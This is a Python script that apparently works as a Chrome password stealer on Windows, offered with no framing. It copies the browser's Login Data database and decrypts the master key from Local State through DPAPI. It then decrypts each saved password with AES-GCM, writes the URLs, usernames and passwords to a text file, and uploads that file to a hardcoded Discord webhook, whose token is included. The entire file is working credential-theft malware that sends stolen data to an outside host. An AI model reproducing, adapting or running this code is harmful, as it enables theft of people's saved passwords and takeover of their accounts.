import base64
import shutil
import sqlite3
from Crypto.Cipher import AES
import json
import win32crypt
import sys
import requests
#Chrome username & password file path
keyFile = f"C:\\Users\\{sys.argv[1]}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
chrome_path_login_db = f"C:\\Users\\{sys.argv[1]}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
shutil.copy2(chrome_path_login_db, "Loginvault.db")
#Connect to sqlite database
conn = sqlite3.connect("Loginvault.db")
cursor = conn.cursor()
#Select statement to retrieve info
cursor.execute("SELECT action_url, username_value, password_value FROM logins")
def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( keyFile, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

        #Remove suffix DPAPI
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

secretKey = get_secret_key()
with open('passwords.txt',"w") as file:
    file.close()

for index,login in enumerate(cursor.fetchall()):
    with open('passwords.txt','a+') as file:
        url = login[0]
        username = login[1]
        ciphertext= login[2]
        if (url):
            file.write(f"Url: {url}\n")
            #print("Url: ",url)
        if (username):
            file.write(f"Username: {username}\n")
            #print("Username: ",username)
        # Step 1: Extracting initilisation vector from ciphertext
        initialisation_vector = ciphertext[3:15]
        # Step 2: Extracting encrypted password from ciphertext
        encrypted_password = ciphertext[15:-16]
        # Step 3:Build the AES algorithm to decrypt the password
        cipher = AES.new(secretKey, AES.MODE_GCM, initialisation_vector)
        decrypted_pass = cipher.decrypt(encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        # Step 4: Decrypted Password
        if (decrypted_pass):
            file.write(f"password: {decrypted_pass}\n")
            #print(f"password: {decrypted_pass}")
        if(url or username or decrypted_pass):
            file.write("-----------------------\n")
            #print("-----------------------")
        file.flush()
webhook_url = 'https://discord.com/api/webhooks/1213302044463595540/83yuwuv9NP--2PXjOQR7iOJhJ8dUUFbuhBTO7AnJVFo-EeVvFGwuDLTec59DAJwFM3sO'
file_path = 'passwords.txt'

with open(file_path, 'rb') as file:
    file_content = file.read()

#payload = {'file': file_content}
files = {
    'file': ('./passwords.txt', open('passwords.txt', 'rb')),
}
response = requests.post(webhook_url, files=files)

